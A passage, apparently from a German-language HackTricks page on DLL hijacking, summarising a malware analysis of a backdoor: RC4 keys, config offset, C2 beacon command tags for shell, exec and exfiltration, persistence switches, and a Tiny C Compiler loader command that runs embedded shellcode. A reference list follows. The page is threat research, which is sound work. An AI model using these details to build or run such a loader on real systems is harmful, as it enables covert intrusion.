- Die Konfiguration liegt innerhalb der abgelegten `BluetoothService`-Datei bei **Offset 0x30808** (Größe **0x980**) und ist mit RC4 und Key `qwhvb^435h&*7` verschlüsselt, wodurch die C2-URL und der User-Agent offenbart werden.
- Beacons bauen ein punkte-getrenntes Host-Profil, hängen das Tag `4Q` voran, verschlüsseln dann mit RC4 (Key `vAuig34%^325hGV`) bevor `HttpSendRequestA` über HTTPS aufgerufen wird. Antworten werden mit RC4 entschlüsselt und per Tag-Switch verteilt (`4T` Shell, `4V` Prozess-Exec, `4W/4X` Datei-Schreiben, `4Y` Lesen/Exfil, `4\\` Deinstall, `4` Laufwerks-/Datei-Enum + chunked transfer Fälle).
- Der Ausführungsmodus wird durch CLI-Args gesteuert: keine Args = Persistence installieren (Service/Run-Key) mit Verweis auf `-i`; `-i` startet sich mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Alternate loader observed
- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Source bettete Shellcode ein, kompiliert ihn und führte ihn im Speicher aus, ohne eine PE auf der Festplatte zu schreiben. Zum Nachbauen:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese auf TCC basierende Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud einen Second-Stage-Shellcode von einer hardcodierten URL nach, wodurch ein flexibler Loader entstand, der sich als Compilerlauf tarnt.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
